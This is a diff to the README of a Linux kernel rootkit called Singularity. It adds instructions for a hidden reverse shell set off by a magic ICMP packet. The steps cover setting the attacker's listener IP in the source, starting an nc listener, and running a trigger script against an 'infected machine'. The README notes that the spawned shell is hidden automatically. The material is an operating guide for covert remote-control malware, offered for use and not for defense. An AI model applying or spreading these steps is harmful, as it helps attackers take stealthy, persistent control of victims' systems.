@@ -64,6 +64,35 @@ You can open a listening port 8081 and that port will be hidden for `ss`. `netst
 <img src="https://i.imgur.com/WUuLu1q.png">
 </p align="center">
 
+### Reverse Shell via ICMP Trigger
+
+Singularity includes a hidden reverse shell activated by a magic ICMP packet sent from the attacker's machine.
+
+1. Configure Target for Reverse Shell
+Before compiling, you MUST configure the IP and port where the reverse shell will connect back.
+
+Edit the file `modules/icmp.c` and modify the following lines with your Listener's IP:
+
+```
+// modules/icmp.c
+#define YOUR_SRV_IP "127.0.0.1" // <--- CHANGE THIS to your Listener IP
+// ...
+```
+2. On attacking machine, set up a listener using `nc` or smth like that on the configured port.
+
+3. Send the Magic Trigger using the `scripts/singularity_icmp_trigger.py` to send the ICMP packet with the magic sequence (1337) to the infected machine.
+
+```
+# Usage: sudo ./scripts/singularity_icmp_trigger.py <TARGET_IP>
+sudo python3 singularity_icmp_trigger.py 192.168.1.100
+```
+
+The rootkit will capture the ICMP packet, trigger the spawn_revshell work, and attempt to connect to the configured `YOUR_SRV_IP:SRV_PORT`. The spawned shell process will be automatically hidden.
+
+<p align="center">
+<img src="https://i.imgur.com/4bmbmwY.png">
+</p align=center">
+
 > **Tested kernels: (**6.8.0-79-generic** and **6.12** only), other kernel versions may not compile or crash, precisely because it was designed for modern 6x kernels. This is a risk you can take, so use it in a VM. You can also modify the code to work on any kernel version you like.**  
 
 ## All credits
